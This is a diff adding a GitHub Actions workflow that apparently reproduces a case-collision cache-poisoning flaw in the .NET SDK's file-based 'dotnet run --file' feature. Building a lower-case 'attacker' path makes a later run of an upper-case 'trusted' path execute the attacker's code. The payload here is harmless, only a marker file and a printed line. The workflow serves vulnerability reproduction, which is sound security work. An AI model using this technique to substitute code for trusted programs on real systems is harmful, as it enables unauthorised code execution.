@@ -1,0 +1,99 @@
+name: SDK file-app stable 10 case collision
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-stable10-case-collision.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  stable10:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Build attacker only then run trusted case variant
+        shell: bash
+        run: |
+          set -euxo pipefail
+          dotnet --info
+          ROOT="$GITHUB_WORKSPACE/.sdk-case-stable10"
+          A="$ROOT/victim/Program.cs"
+          V="$ROOT/VICTIM/Program.cs"
+          MARKER="$RUNNER_TEMP/SDK10_CASE_COLLISION.marker"
+          rm -rf "$ROOT"; rm -f "$MARKER"
+          mkdir -p "$(dirname "$A")" "$(dirname "$V")"
+
+          cat > "$A" <<EOF
+          using System.IO;
+          File.WriteAllText(@"$MARKER","ATTACKER");
+          Console.WriteLine("SDK10_ATTACKER_EXECUTED");
+          EOF
+          cat > "$V" <<'EOF'
+          Console.WriteLine("SDK10_TRUSTED_VICTIM_EXECUTED");
+          EOF
+          touch -d '2020-01-01T00:00:00Z' "$A" "$V"
+
+          HASH=$(python3 - "$A" <<'PY'
+          import hashlib,sys
+          print(hashlib.sha256(sys.argv[1].upper().encode()).hexdigest())
+          PY
+          )
+          HASH2=$(python3 - "$V" <<'PY'
+          import hashlib,sys
+          print(hashlib.sha256(sys.argv[1].upper().encode()).hexdigest())
+          PY
+          )
+          echo "HASH_A=$HASH"
+          echo "HASH_V=$HASH2"
+          test "$HASH" = "$HASH2"
+
+          dotnet build "$A" > "$ROOT/build.out" 2> "$ROOT/build.err"
+          test ! -f "$MARKER"
+          echo "SDK10_BUILD_ONLY_PRECONDITION=PASS"
+
+          dotnet run --file "$V" > "$ROOT/victim.out" 2> "$ROOT/victim.err"
+          cat "$ROOT/victim.out"; cat "$ROOT/victim.err"
+
+          if grep -q 'SDK10_ATTACKER_EXECUTED' "$ROOT/victim.out" && test -f "$MARKER"; then
+            echo "SDK10_COLLISION_RESULT=ATTACKER_EXECUTED"
+          else
+            echo "SDK10_COLLISION_RESULT=NOT_REPRODUCED"
+            exit 1
+          fi
+
+          rm -f "$MARKER"
+          CACHE="$HOME/.local/share/dotnet/runfile/Program-$HASH"
+          echo "CACHE=$CACHE"
+          rm -rf "$CACHE"
+
+          dotnet run --file "$V" > "$ROOT/clean.out" 2> "$ROOT/clean.err"
+          cat "$ROOT/clean.out"; cat "$ROOT/clean.err"
+
+          if grep -q 'SDK10_TRUSTED_VICTIM_EXECUTED' "$ROOT/clean.out" && ! test -f "$MARKER"; then
+            echo "SDK10_CACHE_REMOVAL_CONTROL=TRUSTED_VICTIM_EXECUTED"
+          else
+            echo "SDK10_CACHE_REMOVAL_CONTROL=FAILED"
+            exit 1
+          fi
+
+          cp "$ROOT/"*.out "$GITHUB_WORKSPACE/" || true
+          cp "$ROOT/"*.err "$GITHUB_WORKSPACE/" || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sdk-fileapp-stable10-case-collision
+          path: |
+            *.out
+            *.err
